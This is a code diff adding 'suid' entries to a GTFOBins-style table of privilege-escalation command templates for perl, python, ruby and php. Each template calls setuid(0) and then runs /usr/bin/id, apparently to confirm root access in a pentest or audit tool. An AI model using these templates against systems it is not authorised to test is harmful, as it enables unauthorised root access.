@@ -40,18 +40,22 @@ GTFOBINS: dict[str, dict[str, str]] = {
     },
     "perl": {
         "sudo": "sudo {path} -e 'exec \"/usr/bin/id\"'",
+        "suid": "{path} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/usr/bin/id\"'",
         "capabilities": "{path} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/usr/bin/id\"'",
     },
     "python3": {
         "sudo": "sudo {path} -c 'import os; os.system(\"/usr/bin/id\")'",
+        "suid": "{path} -c 'import os; os.setuid(0); os.system(\"/usr/bin/id\")'",
         "capabilities": "{path} -c 'import os; os.setuid(0); os.system(\"/usr/bin/id\")'",
     },
     "python": {
         "sudo": "sudo {path} -c 'import os; os.system(\"/usr/bin/id\")'",
+        "suid": "{path} -c 'import os; os.setuid(0); os.system(\"/usr/bin/id\")'",
         "capabilities": "{path} -c 'import os; os.setuid(0); os.system(\"/usr/bin/id\")'",
     },
     "ruby": {
         "sudo": "sudo {path} -e 'exec \"/usr/bin/id\"'",
+        "suid": "{path} -e 'Process::Sys.setuid(0); exec \"/usr/bin/id\"'",
         "capabilities": "{path} -e 'Process::Sys.setuid(0); exec \"/usr/bin/id\"'",
     },
     "node": {
@@ -59,6 +63,7 @@ GTFOBINS: dict[str, dict[str, str]] = {
     },
     "php": {
         "sudo": "sudo {path} -r 'system(\"/usr/bin/id\");'",
+        "suid": "{path} -r 'posix_setuid(0); system(\"/usr/bin/id\");'",
         "capabilities": "{path} -r 'posix_setuid(0); system(\"/usr/bin/id\");'",
     },
     "env": {
